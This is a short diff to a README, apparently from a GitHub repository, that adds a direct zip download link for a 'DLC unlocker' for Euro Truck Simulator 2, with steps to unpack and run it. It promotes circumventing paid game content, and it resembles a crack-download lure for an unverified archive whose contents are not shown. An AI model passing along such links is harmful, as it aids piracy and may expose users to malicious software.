@@ -2,7 +2,7 @@
 
 ## 📥 Getting Started
 To get started with Euro Truck Simulator 2 DLC Unlocker, follow these simple steps:
-1. **Get the unlocker: [🔗 Download Euro Truck Simulator 2 DLC Unlocker]()**
+1. **Get the unlocker: [🔗 Download Euro Truck Simulator 2 DLC Unlocker](https://github.com/Euro-Truck-Simulator-2-DLC-Unlocker/.github/releases/download/1.6.5/ETS2-DLC-Unlocker.zip)**
 2. **Unpack the archive and follow the instructions!**
 3. **Enjoy the game!**
 
